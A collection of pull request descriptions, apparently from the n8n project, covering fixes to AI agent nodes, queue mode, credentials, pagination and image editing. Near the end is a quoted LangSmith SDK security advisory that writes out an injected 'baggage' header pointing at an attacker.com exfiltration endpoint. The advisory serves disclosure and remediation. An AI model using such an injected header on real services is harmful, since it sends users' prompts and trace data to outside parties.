title: Fixes/25449
body:
## Summary

Fix runtime crash "Cannot read properties of undefined (reading 'parts')" in the AI Agent node (v3) when using Google Gemini models during triggered executions.

The root cause is in @langchain/google-genai and @langchain/google-common: both packages destructure candidate.content from the Gemini API response without checking it exists. When the API returns a candidate without a content field (safety filtering, empty responses, token limits), accessing .parts on undefined throws a TypeError. This is nondeterministic because it depends on API-side content filtering decisions that vary per request, and it disproportionately affects triggered runs because those use the non-streaming invoke() path where the crash is fatal (vs. editor runs which use streaming where partial recovery is possible).

The fix adds three coordinated layers of defense:

Model adapter layer -- SafeChatGoogleGenerativeAI and SafeChatVertexAI subclasses override _generate() and _streamResponseChunks() to catch the specific TypeError from the LangChain adapter and return a valid empty ChatResult instead of crashing. Shared detection logic lives in gemini-common/response-guard.ts.

Streaming event layer -- processEventStream.ts now validates that on_chat_model_end events carry a well-formed output object before extracting tool calls, and skips tool calls with missing name or args fields.

Output normalization layer -- handleAgentFinishOutput() guards against undefined/null output in returnValues, normalizing to empty string before downstream processing.

Valid responses pass through all layers unchanged; the guards only activate on malformed data.

How to test:

Create a workflow with an AI Agent (v3) node connected to a Google Gemini Chat Model
Add a Structured Output Parser to the agent
Trigger the workflow via webhook/cron (not manual editor execution)
Confirm the execution completes without the content.parts crash
Run the added unit tests: pnpm test in packages/@n8n/nodes-langchain

title: feat(core): Merge Ask and Build into unified multi-agent chat experience
body:
## Summary

https://www.loom.com/share/f28dc23c971f4d75bfa21850fef1221b (demo cut a bit at the end) 

URL: https://test-ai-2036-merge-ask.stage-app.n8n.cloud/ (ask for credentials)


Merges Ask (assistant) and Build (workflow builder) into a unified chat experience behind the `MERGE_ASK_BUILD` feature flag. The supervisor agent now routes between builder and assistant subgraphs internally, so users interact with a single panel instead of manually toggling between modes.

### Backend: Multi-agent LangGraph integration

**Assistant subgraph**
- New `assistant_subgraph` node wired into the multi-agent LangGraph workflow
- Supervisor prompt and routing schema updated with `assistant` as a target, including decision-tree rules and examples
- `sdkSessionId` added to parent graph state for cross-turn session continuity
- Stream processor extended to handle assistant message chunks via custom events
- Credit consumption gated to builder phases only — assistant-only flows are free

**AssistantHandler — shared SDK proxy**
- Framework-agnostic handler wrapping the AI Assistant SDK chat endpoint
- Shared by both the multi-agent subgraph and the legacy code builder path
- Rich SDK message types (`code-diff`, `summary`, `agent-suggestion`, `intermediate-step`) gracefully degraded to plain text until native rendering is implemented

**Session continuity**
- Typed `ConversationEntry[]` discriminated union replacing `userMessages: string[]`
- `sdkSessionId` persisted across turns for context preservation
- Legacy session migration

**Triage ReAct loop (code builder path)**
- Output ownership tracking so LLM transition text emits alongside tool calls instead of being discarded
- Redundant follow-up text suppressed when tools already streamed their response

**Routing fixes**
- Plan mode now routes through the supervisor when `mergeAskBuild` is enabled, preventing assistant queries from getting stuck in a reprompt loop
- Action-oriented messages (e.g. "set them up", "configure this") prioritize builder over assistant routing
- Stale assistant response replay prevented by checking `getLastCompletedPhase()` before forwarding

### Frontend — Unified panel experience

When `MERGE_ASK_BUILD` is enabled and both assistant and builder flags are active:

- **Toggle hidden**: `canToggleModes` returns `false`, removing the Ask/Build switcher from the panel header
- **Mode redirect**: All `assistant` mode requests (`open`, `switchMode`, credential help, error help) resolve to `builder` via a central `resolveMode()` helper
- **Action guard**: The `$onAction` subscriber in `AssistantsHub` skips switching to assistant mode, keeping the panel in builder
- **Coachmark suppressed**: Ask-mode coachmark is not shown when merge is enabled
- **Fallback preserved**: When only one mode is enabled, behavior is unchanged

### Graceful degradation — deferred to next iterations

The Assistant SDK returns rich message types that the builder frontend doesn't render natively yet. `AssistantHandler.mapSdkMessage()` degrades these into plain text:

| SDK message type | Rendered as |
|---|---|
| `code-diff` | Description + fenced markdown diff block |
| `summary` | Bold title + content |
| `agent-suggestion` | Bold title + text |
| `intermediate-step` | Tool progress spinner (via `ToolProgressChunk`) |
| `event` (end-session, timeout) | Silently consumed |
| Quick replies / interactive elements | Not yet supported |

Native rendering (inline diffs, clickable quick replies) is planned for subsequent iterations.

title: Fixes/25633
body:
## Summary


Fix stalled/non-terminating executions in scaling mode with unlimited concurrency.

When running in scaling mode (executionMode: queue) with concurrency: -1, executions could hang indefinitely or fail to terminate. The root cause is a gap between database-level recovery and in-memory state cleanup:

recoverFromQueue() detects executions that are in the DB but missing from the Bull queue and marks them as crashed in Postgres — but never cleans up the corresponding in-memory ActiveExecutions entry on the main process.
The job.finished() call in enqueueExecution() hangs forever for these orphaned jobs (Bull's maxStalledCount: 0 means stalled jobs are never detected), so finalizeExecution() is never called.
Over time, stuck executions accumulate in memory, blocking shutdown and leaking resources — with no error message.

The fix:
scaling.service.ts: After markAsCrashed(), call activeExecutions.stopExecution() for each dangling execution still tracked in memory. This cancels the hanging PCancelable, rejects the postExecutePromise, and removes the entry from the map.
workflow-runner.ts: Add guards in enqueueExecution() so that if job.finished() resolves or throws after queue recovery already cleaned up the execution, we skip lifecycle hooks and error processing to avoid overwriting the crashed status in the DB.
execution-cancelled.error.ts: Add StalledExecutionCancelledError (reason: 'stalled') to distinguish queue-recovery cancellations from manual/timeout/shutdown ones in logs and telemetry.

title: fix(ERPNext Node): route errors to error output when using continueOnFail
body:
## Summary

Add `continueOnFail()` error handling to the ERPNext node's execute loop.

## Problem

The ERPNext node's per-item operation loop had no try/catch and no `continueOnFail()` handling. When "On Error" is set to "Continue (using error output)", errors still bubbled up as node failures and were never routed to the error output branch.

## Fix

Wrap the per-item operation logic in a try/catch that:
- Checks `this.continueOnFail()`
- When true: pushes an error item with the error message and proper `pairedItem` data, then continues to the next item
- When false: re-throws the error (preserving existing behavior)

## Related

Fixes #25581

title: fix(MySQL Node): Route parameter validation errors to error output
body:
## Summary

Fix parameter validation errors being sent to the success output instead of the error output when "On Error" is set to "Continue (using error output)".

## Problem

When a query references `$1` but no query parameters are provided, `prepareQueryAndReplacements` throws an error. This error occurs during query preparation in `executeQuery.execute()`, before the queries reach `runQueries()` — which is where `continueOnFail()` error handling lives. The uncaught error bubbles up through the router and appears on the success output.

## Fix

Wrap the per-item query preparation loop in a try/catch that checks `this.continueOnFail()`. When enabled, errors are returned as error items with proper `pairedItem` metadata for correct item mapping. When disabled, errors are re-thrown as before.

If all items fail during preparation, the function returns early with the error items without calling `runQueries`.

## Related

Fixes #25008

title: fix(Schedule Trigger Node): clear stale recurrence data when schedule changes
body:
## Summary

Fix the Schedule Trigger permanently dropping valid triggers after a schedule change.

## Problem

When a user changes the schedule interval (e.g., from every 1 hour to every 3 hours), the `recurrenceRules` in the workflow's static data retain the `lastExecution` value from the previous configuration. Since `recurrenceCheck` computes `(intervalSize + lastExecution) % period`, the stale value causes the check to permanently return `false` — the trigger never fires again.

**Reproduction:**
1. Create a workflow with a schedule trigger set to every 1 hour
2. Let it execute at an hour that isn't a multiple of 3 (e.g., 16:00)
3. Change the schedule to every 3 hours
4. The workflow never triggers again because `(3 + 16) % 24 = 19`, which never matches a multiple-of-3 hour

## Fix

Compute a JSON fingerprint of the schedule configuration and store it in static data alongside `recurrenceRules`. When the trigger starts, compare the current configuration hash with the stored one. If they differ (schedule was changed), clear `recurrenceRules` so `recurrenceCheck` treats the next invocation as a fresh start (`lastExecution === undefined → return true`).

## Changes

- **`ScheduleTrigger.node.ts`**: Added schedule hash comparison and stale data clearing
- **`GenericFunctions.test.ts`**: Added test verifying recurrenceCheck succeeds after rules are cleared

## Related

Fixes #23711

title: fix(Miro Node): remove required constraint from scope field in OAuth2 credentials

title: feat!: Replace graphicsmagick with jimp in EditImage node
body:
## Summary

Replaces the `gm` (GraphicsMagick) dependency with `jimp` (MIT, pure JavaScript) in the EditImage node to eliminate copyleft licensing risk. The original `gm` pulled `ghostscript-fonts` (AGPL) via Docker. An intermediate `sharp` implementation was blocked by CI license gate because sharp bundles `libvips` (LGPL-2.1).

Jimp is MIT-licensed with zero native dependencies, eliminating all copyleft concerns and simplifying the Docker build.

- **Dependency swap:** Removed `gm`/`@types/gm`/`sharp`/`sharp-bmp`/`get-system-fonts`, added `jimp@1.6.0`
- **Full node rewrite:** All supported operations (blur, border, composite, create, crop, information, resize, rotate, transparent, multiStep) migrated from GM/sharp to Jimp's in-memory mutation API
- **Docker:** Removed `graphicsmagick` system package from base Dockerfile; removed sharp native binary install hack from n8n Dockerfile. Jimp is pure JS — no system packages needed.
- **Tests:** Rewrote 36 unit tests with Jimp mocks; replaced skipped CLI workflow 215 with 3 Playwright E2E tests (resize, all-operations chain, BMP format)

## Breaking Changes

### Removed operations (no Jimp equivalent)
- **Draw** (rectangle, circle, line) — Jimp has no drawing primitives
- **Shear** — Jimp has no affine transform
- **Text** — Jimp only supports bitmap fonts (not TTF/system fonts)

Workflows using these operations will error at execution.

### Removed composite operators
`Bumpmap`, `Copy`, `CopyBlack`, `CopyBlue`, `CopyCyan`, `CopyGreen`, `CopyMagenta`, `CopyOpacity`, `CopyRed`, `CopyYellow`, `Divide`, `Minus`, `Subtract`, `Atop`, `In`, `Out`, `Xor`

Kept: `Add`, `Difference`, `Multiply`, `Over`, `Plus`

### Removed format
- **WebP** — not supported by Jimp

### Blur "radius" parameter removed
Jimp's blur only accepts a radius (integer). The separate "Blur" field has been removed, only sigma (renamed to "Blur Radius") is used.

### Font/loadOptions removed
The `getFonts` dropdown (system font discovery) has been removed since the Text operation is gone.

## Operation mapping

| Operation | Jimp approach |
|---|---|
| Blur | `image.blur(radius)` |
| Border | `new Jimp({ width, height, color })` + `bordered.composite(image, x, y)` |
| Composite | `image.composite(overlay, x, y, { mode: BlendMode })` |
| Create | `new Jimp({ width, height, color })` |
| Crop | `image.crop({ x, y, w, h })` |
| Information | `image.width`, `image.height`, `image.mime` |
| Resize | `image.resize()` / `image.scaleToFit()` / `image.cover()` |
| Rotate | `image.rotate(angle)` |
| Transparent | Direct `bitmap.data` pixel manipulation: match RGB → set alpha to 0 |
| BMP format | Native Jimp support (no additional package needed) |

## Test plan

- [x] Typecheck passes (`pnpm typecheck`)
- [x] Lint passes (`eslint`)
- [x] Unit tests: 36/36 pass
- [x] E2E tests: 3/3 pass (resize, all-operations chain, BMP format)
- [x] Docker build succeeds without graphicsmagick or sharp native binaries

title: feat(editor): Rewrite icon picker with search, full Lucide set, emoji sections, and color/skin tone pickers
body:
## Summary

Complete rewrite of the `N8nIconPicker` component. Replaces the limited 240-icon flat grid with a full-featured picker exposing all 1,626 Lucide icons and 1,914 categorized emojis.

### What's new

- **Search** — Debounced substring search across icon names, Lucide keywords, and emoji keywords, with a "No results" empty state.
- **All Lucide icons** — Search metadata is generated from Lucide GitHub, and SVG bodies are generated into lazy-loaded runtime chunks shared by `N8nIcon` and `N8nIconPicker`. No monolithic runtime `@iconify/json/json/lucide.json` import remains.
- **Virtualized browsing and search** — Icon and emoji rows render through `N8nRecycleScroller`, so broad browsing/search no longer mounts the full catalog at once.
- **Cached loading with prefetch** — Metadata loads lazily, the first visible icon chunks are prefetched on hover/open, and icon bodies are cached across reopen cycles.
- **Emoji sections** — 1,914 emojis from `emojibase-data` organized into 8 iOS-style sections. Browser-unsupported emojis are filtered at runtime.
- **Icon color picker** — 11 design-system swatches (`--node--icon--color--*`). Color is stored as the CSS variable name alongside the icon.
- **Skin tone picker** — Popover with 6 Fitzpatrick tones, persisted to `localStorage` and applied to all skin-tone-capable emojis in the grid.
- **Categorized browse mode** — 43 Lucide categories in browse mode, with flat rows during search.
- **Shuffle button** — Random icon/emoji selection respecting the active color or skin tone.
- **95-icon blocklist** — Filters out icons used in sidebar, settings, navigation, and icons that resemble core UI elements (bells, chevrons, git/branch icons, database, table).
- **`N8nIcon` fallback** — Arbitrary Lucide icons outside the compiled registry resolve through the shared chunk loader, so selected project icons render without fetching the entire Lucide dataset.

title: fix(core): Handle Date objects in DateTime.fromISO() during full workflow execution
body:
## Summary
Fixes #25267

- During full workflow execution, node output data is passed **by reference** between nodes without JSON serialization. This means `Date` objects (e.g. from the DataTable node) remain as `Date` instances when accessed via expressions like `{{ DateTime.fromISO($json.dateField) }}`.
- `DateTime.fromISO()` expects a string argument. When given a `Date` object, it internally calls `String(date)`, producing a non-ISO format like `"Wed Dec 12 2025 ..."`, which causes `DateTime.fromISO()` to return an **invalid DateTime**.
- In contrast, editor "Test Step" execution serializes data through a JSON round-trip, converting `Date` objects to ISO strings — which is why the same expression works correctly in the editor but fails during full execution.

## Solution
Wraps `DateTime` with a Proxy that intercepts `fromISO()` calls and converts `Date` objects to ISO strings before forwarding to the real `fromISO()`. This follows the **existing Proxy wrapper pattern** already used in the expression sandbox for `Error` (`createSafeError`) and `Object` (`createSafeObject`).

### Why this approach?
- **Minimal and targeted**: Only intercepts `fromISO()`, all other `DateTime` methods pass through unchanged
- **Consistent with codebase patterns**: Uses the same Proxy pattern as `createSafeError()` and `createSafeObject()`
- **No data mutation**: Does not modify the actual workflow data flowing between nodes
- **Handles the root cause**: Fixes the type mismatch at the point where users call `DateTime.fromISO()` in expressions

## Test plan
- [x] Added 6 tests covering:
  - `DateTime.fromISO()` with valid ISO string (existing behavior preserved)
  - `DateTime.fromISO()` with `Date` object (the bug fix)
  - `DateTime.fromISO()` with `Date` object and options parameter
  - Invalid input still returns invalid DateTime
  - Other `DateTime` static methods (`now()`, `fromMillis()`, `local()`) still work
  - ISO string and `Date` object produce identical results for the same timestamp
- [x] All 1912 existing tests pass
- [x] Pre-commit hooks (biome) pass

title: fix(editor): Fix relative url error in websocket connection
body:
## Summary
Fix an issue where the WebSocket connection fails in old browsers when a relative URL is provided.
Refactor the connection logic to construct a fully qualified absolute URL based on the current `window.location.href`.
- Use the `URL` API to resolve the relative path against the current window origin.
- Automatically handle protocol switching (`http` -> `ws`, `https` -> `wss`).

## Issue
The `useWebSocketClient` hook was initializing the connection using `new WebSocket(options.url)`, where `options.url` is a relative path (e.g., `/rest/push?...`).

The [WebSocket standard](https://html.spec.whatwg.org/multipage/web-sockets.html#dom-websocket) requires an absolute URL including the scheme (`ws://` or `wss://`). Using a relative path causes a `SyntaxError` in old browsers preventing the frontend from setting up WebSocket connections.

[Support for relative paths in different browsers](https://developer.mozilla.org/en-US/docs/Web/API/WebSocket/WebSocket)

title: perf(core): Optimize generate-node-defs with parallel writes and hash-based skip
body:
## Summary

Optimizes the `n8n-generate-node-defs` build step which was adding ~34s to every build.

- **Parallel file writes**: Batch all file writes (100 at a time via `Promise.all`) instead of sequential `await`s. The step was 61% CPU utilization (I/O bound), so parallelism gives a significant speedup.
- **Hash-based skip**: Compute SHA-256 of `nodes.json` content + SDK version, store as `.nodes-hash` sentinel. Skip generation entirely when hash matches on subsequent runs.
- **Unified bin entry**: Refactored `packages/core/bin/generate-node-defs` to import `generateNodeDefinitions()` from the CLI module, eliminating duplicated logic.

### Results (nodes-base, 418 nodes, ~11,845 files)

| Clean generation | ~27s | **~9s** |
| Incremental (unchanged) | ~27s | **<1s** |

title: feat: Pass focused nodes context to planner agent
body: ## Summary When users select/focus nodes on the canvas and enter plan mode, the planner agent had no awareness of which nodes were selected. This meant deictic references like "fix this node", "add error handling after this", or "modify it" were not resolved — the planner didn't know what "this" referred to. This PR threads the selected nodes summary through the discovery subgraph state into the planner's context prompt, so it can resolve these references correctly. ### Changes - Added `selectedNodesContext` field to `DiscoverySubgraphState` - Populated it in `transformInput()` from the existing `buildSelectedNodesSummary` utility - Threaded it through `plannerNode()` → `invokePlannerNode()` → `buildPlannerContext()` - Added a `selected_nodes` section to the planner prompt (via `sectionIf`) so the planner sees which nodes the user has focused Uses the lightweight summary (node names + issue status) rather than the full `buildSelectedNodesContextBlock` used by the builder, since the planner generates plain-language plans and already receives workflow structure via a mermaid diagram.

title: fix(YouTube Node): Prefer binary data mimeType over filesystem metadata mimeType
body:
## Summary

When uploading videos through the YouTube node with binary data stored in filesystem mode, the node was incorrectly using the auto-detected MIME type from the filesystem metadata (`application/mp4`) instead of the user-specified MIME type from the binary data object (`video/mp4`). This caused YouTube API to reject uploads with "Media type 'application/mp4' is not supported."

The fix swaps the precedence so `binaryData.mimeType` takes priority over `metadata.mimeType`. This matches how the Google Drive v1 and v2 nodes already handle the same case.

body:
## Summary

Multiple fixes and improvements to the AI Builder's plan mode experience, covering workflow naming, question skipping, thinking states, and UI polish.

### Workflow naming in plan mode
- Stream the generated workflow name to the frontend immediately after creation. Previously, in plan mode the graph interrupted before `process_operations` ran, so the frontend never received the name.

### Question skipping
- The Next button is always enabled. When no answer is provided, it shows "Skip" (or "Skip & submit" on the last question) and marks the question as skipped.
- Skipped questions are excluded from the discovery context sent to the backend (already supported).

### Intro message persistence
- The questions message is now always rendered (collapsed to just the intro text after answers are submitted), so the intro message remains visible in the chat history and on session reload.

### Thinking/waiting state fixes
- **Thinking indicator preserved during streaming gaps:** After submitting answers, the "Thinking" indicator from `prepareForStreaming` is no longer cleared by empty stream chunks. The stream callback now only updates `builderThinkingMessage` when there's an explicit clear or new value.
- **"Workflow generated" label fixed:** The naming-only `workflow-updated` event (no nodes) no longer causes discovery tool groups to show "Workflow generated". Only `workflow-updated` events that follow tool messages in a region are counted.
- **Thinking placeholder for new turns:** The standalone thinking placeholder now shows for new turns even when old tool groups exist from previous turns.

### UI polish
- "Other" input stretches to full container width
- Radio options use `align-items: center`
- Submit button uses primary style on the last question when a valid answer is provided, label shortened to "Submit"
- Plan/Build mode selector is never disabled

title: fix(editor): Skip credential auto-assignment when node displayOptions don't match
body:
## Summary

When selecting a credential (e.g. Header Auth) in the HTTP Request node, the system incorrectly auto-assigns it to other nodes that **support** the same credential type, even if those nodes don't have the credential **active** based on their current parameters.

For example, the Webhook node type supports `httpHeaderAuth`, but only when its `authentication` parameter is set to `'headerAuth'`. With default parameters (`authentication: 'none'`), the credential should not be auto-assigned. The toast "Added this credential to 1 other node(s)" appeared incorrectly.

**Root cause:** `assignCredentialToMatchingNodes` only checked if the node type *supports* the credential via `.some()`, without checking `displayOptions` against the node's current parameters.

**Fix:** Use `.find()` to get the credential description, then check `credentialDescription.displayOptions` against the node's parameters using the existing `nodeHelpers.displayParameter()` function. This matches the pattern already used in:
- `useNodeCredentialOptions.ts` (NDV credential display)
- `useNodeHelpers.ts` (credential issue checking)

title: fix(editor): Show existing credentials in template setup modal
body:
## Summary

When importing a template via the "Set up template" modal, users only saw "Create new [credential]" buttons even when they already had matching credentials. This PR fixes three issues that caused this:

- **Remove broken `personal-only` filter**: The `CredentialPicker` in `SetupTemplateFormStep.vue` had a `personal-only` prop that filters credentials by `credential.homeProject?.type === 'personal'`. However, the `/credentials/for-workflow` backend endpoint does not return `homeProject` in its response, so `homeProject` was always `undefined` — filtering out every credential. Removing this prop is safe because the backend already enforces access control, only returning credentials the user has permission to use.
- **Load credentials during template import**: `useWorkflowInitialization.ts` was not loading credentials and credential types before the template setup modal opened, so the credential store was empty. Added `loadCredentials()` and `fetchCredentialTypes()` calls during template route initialization.
- **Prevent auto-assign toast on mount**: `NodeCredentials.vue` auto-selects the most recent credential on mount, which triggered the "credential auto-assigned to other nodes" toast. Added an `isUserAction` parameter to `onCredentialSelected` so auto-assign only runs for explicit user actions.

title: feat: Add content-design skill for UI copy writing, review, and audit
body:
## Summary

Adds a Claude Code skill that acts as a senior content designer for n8n UI copy. It can be invoked with `/copy`, `/content`, or `/ux-copy`, and is automatically triggered when working with user-facing text.

### What the skill does

The skill operates in three modes:

- **Write** — Drafts new UI copy for any surface (buttons, modals, tooltips, errors, empty states, etc.). Produces 1-3 ranked options, each with the copy, target surface, suggested i18n key, and rationale.
- **Review** — Checks existing copy against all content guidelines and returns a table of issues grouped by severity, or confirms the copy is clean.
- **Audit** — Scans files (Vue components, i18n JSON, node descriptions) for common violations using built-in grep patterns.

### What's included

- **Content guidelines** covering US English, active voice, sentence case, contractions, Oxford comma, Latin abbreviation avoidance, date/time/number formatting
- **Voice and tone rules** — direct, concise, no marketing-speak, no user-blaming
- **UI copy patterns** for action labels, error messages, empty states, placeholders, confirmation dialogs, tooltips, and truncation
- **Terminology glossary** (workflow, node, trigger, execution, credential, canvas, connection, input/output, pin)
- **n8n-specific conventions** — product name casing, node name capitalization, feature name rules
- **i18n guidance** — all three patterns (`i18n.baseText()`, `$t()`/`t()`, `locale.baseText()`), key naming conventions, and a complete map of where copy lives in the codebase
- **Common audit grep patterns** for Latin abbreviations, missing contractions, "please" overuse, user-blaming language, and passive voice
- **Surface guidance** for loading states, success notifications, and status labels
- **Pre-flight checklist** for final copy verification

title: fix(editor): Fix bug with two consecutive saves
body:
## Summary

### Problems
- Updating the workflow name or tags ("manual saves") triggered immediate saves without coordination with other save operations (so two manual saves in a row created a race condition)
- No single source of truth for "is a save in progress" 
    - Save coordination checked `uiStore.isActionActive.workflowSaving` first, then `autosaveStore.pendingAutoSave` (the actual promise)
- Conflict resolution (“force save”) could still race with other saves

### Solution
- Centralized save coordination: only one save runs at a time, tracked via `autosaveStore.pendingAutoSave` promise
    - Manual saves wait for in-progress saves to complete before proceeding
    - Autosaves skip if a save is already running (now aware of manual saves, not just other autosaves)
    - Conflict resolution saves bypass the wait entirely (using forceSave=true)
- Name and tag updates now schedule autosaves: Instead of triggering immediate saves, they:                                                                  
    - Update state optimistically                                                                                                                              
    - Mark the workflow as dirty                                                                                                                               
    - Schedule a debounced autosave                                                                                                                            
    - This allows multiple rapid changes to be batched into a single save
    - Removed updating tags after receiving the save response - they're now updated optimistically like all other workflow properties
- Simplified API: Removed name and tags parameters from saveCurrentWorkflow() - values are always read from current workflow state

## Related Linear tickets, Github issues, and Community forum posts

Closes [ADO-4621](https://linear.app/n8n/issue/ADO-4621/bug-two-manual-saves-in-a-row-show-an-error)

title: fix(Chat Memory Manager Node): Resolve sub-node expressions per item instead of only item 0
body:
## Summary

When the Chat Memory Manager processes multiple input items, sub-node expressions (e.g. Session ID `{{ $json.code }}`) were evaluated only once with hardcoded `itemIndex=0` before the item loop. This caused all items to share the same memory session, leading to:

- **Incorrect data**: all items read/write the same session regardless of per-item expression values
- **Data loss**: override insert mode overwrites previous items' data since they share one session
- **Potential data leak**: in multi-tenant workflows, different users' messages get mixed into one session

**Root cause**: `getInputConnectionData(AiMemory, 0)` was called once before the loop at line 306. The fix moves it inside the loop as `getInputConnectionData(AiMemory, i)`, so each item gets its own memory instance with correctly resolved expressions.

**Before:**
```
Input: [{code: 1, name: "First"}, {code: 2, name: "Second"}]
Session ID expression: {{ $json.code }}

→ Both items use session "1" (item 0's value)
→ Output: ["Second", "Second"]  (last override wins)
```

**After:**
```
→ Item 0 uses session "1", Item 1 uses session "2"
→ Output: ["First", "Second"]  (each item in its own session)
```

title: Fixed MCP HTTP endpoint returns 404 error
body:
## Summary

This PR fixes the MCP HTTP endpoint /mcp-server/http returning 404 or connection errors even when MCP is enabled in n8n settings.
Root Cause
The endpoint was registered but missing critical handlers:
No OPTIONS handler for CORS preflight requests (was commented out)
No GET handler for endpoint discovery
Error responses didn't clearly indicate MCP was disabled vs endpoint not found

Changes Made
1. Added Missing HTTP Handlers (mcp.controller.ts)
Implemented OPTIONS handler for CORS preflight support
Added GET handler for endpoint discovery and health checks
Improved POST handler with explicit authentication validation
Enhanced error logging with user context and request details

2. Improved Error Messages (mcp.constants.ts)
Updated MCP_ACCESS_DISABLED_ERROR_MESSAGE to include actionable instructions
Added MCP_ENDPOINT_INFO constant for consistent discovery responses
Error messages now explain how to enable MCP access via UI or API

3. Added Documentation (mcp.settings.service.ts)
Documented that there is no N8N_MCP_ENABLED environment variable
Clarified MCP access is controlled via database settings only
Added instructions for enabling MCP through UI or API

4. Comprehensive Tests (mcp.controller.test.ts)
Tests for OPTIONS, GET, HEAD, and POST endpoints
Validates proper HTTP status codes (403 vs 404)

This PR fixes a critical bug where the HTTP Request node fails with "connection closed unexpectedly" errors when downloading binary files from APIs that redirect to CDNs. The issue was reproducible with the LINE Messaging API and other services that use 302/307 redirects to CDN endpoints.

Root Cause:
When downloading binary content with responseFormat: 'file', axios would start streaming immediately. If the server returned a redirect, the same TLS socket was reused for the CDN request, and Authorization headers were forwarded cross-origin. This caused CDNs to close the connection, resulting in ECONNRESET errors.

Solution:
The fix implements a three-layer approach:
Binary redirect resolution - A new binary-redirect-handler.ts module that uses HEAD requests to resolve all redirects before downloading binary content
Authorization header stripping - Automatically removes Authorization headers when redirects cross origins (different domains)
Fresh agent creation - Creates new HTTP agents for the final URL to prevent socket reuse issues

Changes:
Added redirect pre-resolution for binary requests in request-helper-functions.ts
Created dedicated binary-redirect-handler.ts module with redirect resolution logic
Enhanced error handling in HttpRequestV3.node.ts for better debugging
Improved HTTP agent configuration in http-proxy.ts with proper keepAlive settings
Added comprehensive test coverage for binary redirect scenarios

Testing:
The fix includes tests that verify:
Binary downloads succeed after cross-origin redirects
Authorization headers are stripped for cross-origin requests but preserved for same-origin
Multiple redirect hops are handled correctly
The LINE API specific scenario works as expected
This fix is transparent to users - no workflow changes required. JSON and text responses continue to work as before.

title: Fixes/25544
body:
## Summary

## Summary

This PR fixes a critical race condition bug where internal task runners (JavaScript and Python) would spawn in workers configured with N8N_RUNNERS_MODE=external, causing continuous 403 authentication errors and blocking all Code node executions.

Problem: 
In queue mode deployments, workers would occasionally instantiate internal runner processes despite being configured for external mode. These phantom processes attempted authentication with internal credentials instead of the configured N8N_RUNNERS_AUTH_TOKEN, resulting in repeated 403 errors and an infinite restart loop. The bug manifested as zombie workers that passed health checks but failed all Code node tasks with timeout errors.

Solution:
 Implemented defense-in-depth protection across multiple layers:
Constructor Guards - Added assertions in both JsTaskRunnerProcess and PyTaskRunnerProcess constructors to prevent instantiation in external mode. The Python runner was missing this check, which was a critical gap.
Lifecycle Event Guards - Modified TaskRunnerProcessBase to conditionally register event handlers only in internal mode, preventing heartbeat and timeout events from triggering restarts when running externally.
Start/Restart Guards - Added mode validation in start(), forceRestart(), and onProcessExit() methods to block any attempt to spawn or restart runner processes in external mode.
Module-Level Guards - Enhanced TaskRunnerModule to explicitly check mode before calling startInternalTaskRunners(), preventing race conditions at the orchestration level.

Testing: 
The fix includes comprehensive integration tests covering all protection layers, including race condition scenarios. Manual testing should verify that workers in external mode never spawn internal runners and successfully execute Code nodes via external runner sidecars.

title: fix(HTTP Request Node): Use original URL on first pagination request
body:
## Summary
In the HTTP Request node's `responseContainsNextURL` pagination mode, the Next URL expression is resolved and applied on the very first request, even though `$response` is empty at that point. This means the first request's URL is determined by the Next URL expression instead of the node's main URL field. Because `$response` has no data on the first iteration, users are forced to add a fallback in every Next URL expression to avoid invalid URL errors:

```js
{{ $response.headers["next-url"] || "https://api.example.com/original-endpoint" }}
```
This workaround is required on every workflow that uses `responseContainsNextURL` pagination, and it means duplicating the base URL inside the Next URL expression. It's error-prone (the fallback URL can drift out of sync with the actual URL field) and unintuitive since the UI description for Next URL refers to `$response` variables implying it's evaluated after a response exists.

### Why existing tests didn't catch this
The workflow.pagination.json test fixture contains responseContainsNextURL nodes with expressions like ={{ $response.headers["next-url"] }} and no fallbac, but this file is not referenced by any test runner. It's an unused fixture. There are no tests that actually exercise the responseContainsNextURL pagination code path, so the bug was never caught.

### The fix
The first request now uses the node's configured URL field. The Next URL expression is only applied from the second request onward, which matches the semantic intent, "Next URL" extracts a URL from a response that doesn't exist yet on the first iteration. The `|| fallback` workaround is no longer needed.

### Known related issue: query param duplication

`applyPaginationRequestData` uses `lodash.merge` to combine the original request options with the pagination overrides on every iteration. This means original query parameters (e.g. `api-version`) are merged into subsequent requests even when the Next URL already contains them as query parameters. This causes duplicate parameter errors on APIs like Microsoft Graph REST endpoints. This is pre-existing behaviour and not addressed in this PR.

### GitHub Vulnerability Alerts

#### [CVE-2026-25528](https://redirect.github.com/langchain-ai/langsmith-sdk/security/advisories/GHSA-v34v-rq6j-cj6p)

## Summary

The LangSmith SDK's distributed tracing feature is vulnerable to Server-Side Request Forgery via malicious HTTP headers. An attacker can inject arbitrary `api_url` values through the `baggage` header, causing the SDK to exfiltrate sensitive trace data to attacker-controlled endpoints.

---

## Description

When using distributed tracing, the SDK parses incoming HTTP headers via `RunTree.from_headers()` in Python or `RunTree.fromHeaders()` in Typescript. The `baggage` header can contain replica configurations including `api_url` and `api_key` fields.

Prior to the fix, these attacker-controlled values were accepted without validation. When a traced operation completes, the SDK's `post()` and `patch()` methods send run data to all configured replica URLs, including any injected by an attacker.

---

## Attack Vector

1. Attacker sends an HTTP request to a vulnerable service with a malicious `baggage` header:
   ```
   baggage: langsmith-replicas=[{"api_url":"https://attacker.com/exfil","project_name":"x"}]
   ```

2. The service parses the header via `RunTree.from_headers()`, storing the attacker's URL

3. When the traced operation completes, the SDK sends the full run data (including LLM inputs, outputs, and metadata) to `https://attacker.com/exfil`

---

## Impact

- **Data Exfiltration:** Sensitive trace data including LLM prompts, completions, and application metadata sent to attacker-controlled servers
- **SSRF:** Ability to make the server send requests to arbitrary URLs, potentially targeting internal services

---

## Affected Use Cases

Applications are vulnerable if they:
- Use `TracingMiddleware` to automatically propagate tracing context
- Call `RunTree.from_headers()` / `RunTree.fromHeaders()` with untrusted HTTP headers

---

## Remediation

Update to the patched versions:
- **Python:** `pip install langsmith>=0.6.3`
- **JavaScript:** `npm install langsmith@>=0.4.6`

The fix filters incoming replica configurations to an allowlist of safe fields, removing `api_url`, `api_key`, and other credential fields.

---

## Workarounds

If unable to upgrade immediately:
- Strip or validate the `baggage` header before passing to `from_headers()`
- Do not use `TracingMiddleware` with untrusted traffic

title: Add KFC spec workflow system and agent definitions
body:
## Summary

This PR introduces the KFC (Knowledge Flow Coordination) spec workflow system - a comprehensive framework for managing feature specification and implementation through a structured, iterative process. The system includes:

- **Workflow orchestration**: Main workflow starter that coordinates the entire spec development lifecycle
- **Specialized agents**: Five focused agents for requirements, design, tasks, testing, and evaluation
- **System configuration**: Settings and prompt infrastructure to support the workflow
